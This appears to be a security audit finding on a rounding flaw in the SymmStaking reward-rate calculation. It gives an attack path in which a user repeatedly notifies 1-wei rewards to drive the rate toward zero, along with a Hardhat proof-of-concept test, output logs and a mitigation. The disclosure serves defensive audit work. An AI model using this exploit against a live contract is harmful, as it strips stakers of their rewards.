# Stakers lose most rewards because of the precision loss

### Summary

When we notify the rewards, we will update the reward rate. The round down in the `state.rate`'s calculation will cause reward loss.

### Root Cause

In [SymmStaking::notifyRewardAmount](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275), any users can distribute some rewards token to start one new distribution reward epoch. 

If the previous reward epoch does not finish, we will merge the remaining rewards into the new reward epoch. We use the formula like this:`state.rate = (amount + leftover) / state.duration`. The problem here is that there is one round down in the calculation. And the maximum loss for one round down is `state.duration - 1`(around 604800). If the reward token is USDC(6 decimals), one round down's precision loss can reach to 0.6 USDC. If malicious users keep notifying rewards via 1 wei to let the `state.rate` updated and round down. The rate will keep decreasing, even decreasing to 0.

For example:
1. Admin notifies 120960000 USDC(around 120 Dollar USD) into the staking contract in timestamp X. The rate is 200.
2. Alice stakes some SYMM to earn the rewards. Alice is the only staker, and Alice expects to get all rewards, around 120 USD.
3. Bob notifies rewards 1 wei via `notifyRewardAmount` in timestamp X + 2, the rate will be round down to 199.
4. Bob notifies rewards 1 wei via `notifyRewardAmount` in timestamp X + 4, the rate will be round down to 198.
5. Bob repeats to notify 1 wei rewards, the rate will be round down to 0.
6. Alice wants to claim rewards, she can only claim one small part from the expected rewards.

```solidity
	function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) external nonReentrant whenNotPaused {
		_updateRewardsStates(address(0));
		if (tokens.length != amounts.length) revert ArraysMismatched();

		uint256 len = tokens.length;
		for (uint256 i = 0; i < len; i++) {
			address token = tokens[i];
			uint256 amount = amounts[i];

			if (amount == 0) continue;
			if (!isRewardToken[token]) revert TokenNotWhitelisted(token);
			IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
			pendingRewards[token] += amount;
			_addRewardsForToken(token, amount);
		}
		emit RewardNotified(tokens, amounts);
	}

	function _addRewardsForToken(address token, uint256 amount) internal {
		TokenRewardState storage state = rewardState[token];
		if (block.timestamp >= state.periodFinish) {
			state.rate = amount / state.duration;
		} else {
			uint256 remaining = state.periodFinish - block.timestamp;
			uint256 leftover = remaining * state.rate;
			state.rate = (amount + leftover) / state.duration;
			console.log("current rate: ", state.rate);
		}
		// update lastUpdated.
		state.lastUpdated = block.timestamp;
		// update period finish.
		state.periodFinish = block.timestamp + state.duration;
	}

```

### Attack Path

1. Admin notifies 120960000 USDC(around 120 Dollar USD) into the staking contract in timestamp X. The rate is 200.
2. Alice stakes some SYMM to earn the rewards. Alice is the only staker, and Alice expects to get all rewards, around 120 USD.
3. Bob notifies rewards 1 wei via `notifyRewardAmount` in timestamp X + 2, the rate will be round down to 199.
4. Bob notifies rewards 1 wei via `notifyRewardAmount` in timestamp X + 4, the rate will be round down to 198.
5. Bob repeats to notify 1 wei rewards, the rate will be round down to 0.
6. Alice wants to claim rewards, she can only claim one small part from the expected rewards.

### Impact

Stakers may lose most of the staking rewards because of the precision loss.

### PoC

Add this test case into symmStaking.behavior.ts.

```javascript
	describe("Reward Calculation", function () {
		it.only("POC should calculate reward correctly after single user deposit", async function () {
			const depositAmount = "120960000"; // 604800 * 200, 200 wei per seconds.
			const rewardAmount = depositAmount
			// Step1: user1 deposit, user1 is the only depositor.
			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
			await symmStaking.connect(user1).deposit(depositAmount, user1.address)
			// Step2: notify rewards
			await stakingToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [rewardAmount])

			for(let i = 0; i < 200; i++) {
				await time.increase(2)
				await stakingToken.connect(user2).approve(await symmStaking.getAddress(), 1)
				//const balance = await stakingToken.balanceOf(user2.address);
				await symmStaking.connect(user2).notifyRewardAmount([await stakingToken.getAddress()], [1])	
			}
			await time.increase(7 * 24 * 60 * 60);
			const user1BalanceBefore = await stakingToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1BalanceAfter = await stakingToken.balanceOf(user1.address)
			const claimed = user1BalanceAfter - user1BalanceBefore
			console.log("Claimed amount: ", claimed);
		})
```
The log is as below:
```bash
Claimed amount:  80399n
```
The user1 expects to get `120960000` USDC rewards, but he can only get `80399` USDC rewards.

### Mitigation

Add one precision decimal in the rate's calculation.
